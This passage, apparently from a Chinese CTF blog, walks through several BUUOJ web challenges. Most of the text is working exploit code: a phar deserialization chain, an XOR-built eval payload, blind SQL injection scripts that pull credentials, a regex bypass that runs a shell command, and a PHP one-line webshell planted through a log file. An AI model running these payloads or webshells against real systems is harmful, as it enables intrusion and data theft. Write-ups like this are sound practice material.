class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以发现最下面有一个<code>file_get_contents</code>，这里应该是拿flag的地方，但是要先跑close()方法，这里看到上面的User类，这里执行__destruct()方法后会执行一个$this-&gt;db-&gt;close()，但是User里并没有close()方法，所以应该是从这里调用close()方法，然后看到FileList()类，这里有一个__call方法，那么我们可以使User类中的$db = new FileList()，这样就会执行FileList中的__call方法，进而执行close()，然后我们需要执行的是File中的close，所以我们可以使FileList中的$files = array(new File())，这样就可以调用File中的close方法了</p><p>最终的exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">// 这里的GIF89a是伪造gif</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$object</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>然后由于download里把flag过滤了，所以我们可以从delete里跑phar流</p><p><img src="https://i.loli.net/2021/04/24/zuUbQ74EipNXfS1.png"></p><p>就可以拿到flag了</p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>ctrl+U发现源代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123; <span class="comment">// 判断有无_</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123; <span class="comment">// 判断有无23333</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下划线可以用%20绕过，<a href="https://www.freebuf.com/articles/web/213359.html">原理在这</a>，而字符串可以用%0a绕过，tips: %0a为url编码后的换行符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b%<span class="number">20</span>u%<span class="number">20</span>p%<span class="number">20</span>t%<span class="number">20</span>=<span class="number">23333</span>%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><p>然后得到一个secrettw.php，</p><p><code>Flag is here~But how to get it?Local access only! Sorry,you don&#39;t have permission! Your ip is :sorry,this way is banned!</code></p><p>ctrl+U查看源码可以发现一大串JSfuck代码，<a href="https://blog.csdn.net/qq_36539075/article/details/79946099?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161952195616780264035600%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161952195616780264035600&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-79946099.first_rank_v2_pc_rank_v29&utm_term=jsfuck">原理看这</a>，然后得到<code>post me Merak</code>，post传参得到一串php代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里用了一个change函数用来过滤参数，所以反过去构造一个flag.php就好了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$er</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$ch</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$er</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$ch</span> .= chr(ord(<span class="variable">$er</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span> * <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/27/3tuBYJGKLRkWyVC.png"></p><p>得到flag</p><blockquote><p>flag{9248d40f-8f53-42ff-96c4-801f863b7783}</p></blockquote><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>题目给出了源代码，可以看出是一道40字的RCE题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里用异或进行构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="variable">$_</span>=%<span class="number">27</span>`&#123;&#123;&#123;%<span class="number">27</span>^%<span class="number">27</span>?%<span class="number">3</span>C%<span class="number">3</span>E/%<span class="number">27</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[%<span class="number">22</span>l%<span class="number">22</span>])</span><br></pre></td></tr></table></figure><p>然后可以用蚁剑登陆进去，直接读flag发现读不出来，查了下发现可以用一个bypass disable_functions插件</p><p>选择PHP7_GC_UAF模式</p><p><img src="https://i.loli.net/2021/04/27/pEDXtquYRdMmaLv.png"></p><p>然后进入到虚拟终端直接读readflag</p><p><img src="https://i.loli.net/2021/04/27/kGsCcqQb2XxZHS8.png"></p><p>最后即可得到flag</p><blockquote><p>flag{43b277ae-fc71-49ac-8350-265816ba9161}</p></blockquote><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>简单的布尔盲注</p><p>这里直接放脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b09bacde-3fcf-4429-a2d2-6d099630fc8a.node3.buuoj.cn/?stunum=&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetData</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        Left = <span class="number">32</span></span><br><span class="line">        Right = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> Left &lt; Right:</span><br><span class="line">            content = <span class="string">&quot;select/**/group_concat(concat_ws(0x7e,/**/value))/**/from/**/flag&quot;</span></span><br><span class="line">            mid = <span class="built_in">int</span>((Left + Right) / <span class="number">2</span>)</span><br><span class="line">            sql = <span class="string">f&quot;if((ascii(substr((<span class="subst">&#123;content&#125;</span>),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),1,0)&quot;</span></span><br><span class="line">            res = requests.get(url + sql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hi admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                Right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Left = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;Left new is: &#123;Left&#125;&quot;)</span></span><br><span class="line">            <span class="comment"># print(f&quot;Right new is: &#123;Right&#125;&quot;)</span></span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((Left + Right - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">        print(<span class="string">f&quot;The Result new is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    GetData()</span><br></pre></td></tr></table></figure><p>直接爆出flag</p><blockquote><p>flag{b8a8d39f-41c5-49d8-8f8f-80a3bd78e244}</p></blockquote><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>进入题目说要登入一个admin账户，注意这里有一句</p><p><code>We found the account cookie/ monster</code></p><p>试下username=cookie，password=monster，成功登入，但是是用的cookie账户登入的。</p><p>这里抓包改成admin即可得到flag</p><blockquote><p>flag{c9db885c-078b-491f-871d-22bb4b6f3a04}</p></blockquote><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>进入题目后要求输入JSON代码</p><p>直接rce, </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=&#123;%0a<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%0a&#125;</span><br></pre></td></tr></table></figure><p>原因：</p><p>由于preg_match只读一行，所以可以利用%0a(换行符)进行绕过</p><p>还有一种方法，可以利用PCRE的回溯次数限制进行绕过，<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">原理在这</a></p><p>所以咱们可以构造脚本进行攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://be96ec7d-da8b-4fef-b553-0d08a4bca0a5.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>: payload&#125;)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>即可得到flag</p><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><p>在robots.txt里发现了一个<code>*.php.bak</code>。</p><p>直接下载备份文件<code>image.php.bak</code>。</p><p>得到<code>image.php</code>的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] : <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span> = addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>, <span class="string">&quot;%00&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span> = str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>, <span class="string">&quot;%00&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$con</span>, <span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><p>这里由于单引号被ban了，所以我们可以通过<code>\0</code>进行绕过。</p><p>然后还有一点就是爆列名的时候由于单引号被ban掉了，所以我们可以用十六进制进行绕过。</p><p>这里是payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url_here/image.php?id=\\0&amp;path=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFlag</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    needsql = <span class="string">&quot;select group_concat(concat_ws(0x7e, username, password)) from users&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">            sql = <span class="string">f&quot;or if(ascii(substr((<span class="subst">&#123;needsql&#125;</span>),<span class="subst">&#123;x&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&quot;</span></span><br><span class="line">            res = requests.get(url+sql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;JFIF&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] left now is: &#123;left&#125;&quot;)</span></span><br><span class="line">            <span class="comment"># print(f&quot;[+] right now is: &#123;right&#125;&quot;)</span></span><br><span class="line">        result += <span class="built_in">chr</span>((left + right - <span class="number">1</span>) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">        print(<span class="string">f&quot;[*] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后就可以爆出用户名和密码，直接登陆</p><h3 id="PHP短标签"><a href="#PHP短标签" class="headerlink" title="PHP短标签"></a>PHP短标签</h3><p>登陆后发现需要上传文件，随便上传个马上去，得到文件名不能包含php字符串。</p><p>这里发现文件名会被写入到日志里，于是直接写个马进去。</p><p><code>&lt;?=eval($_POST[&#39;a&#39;]);?&gt;</code>，然后用蚁剑成功登入拿到flag。</p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>点击source之后可以查看到index.php的源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are 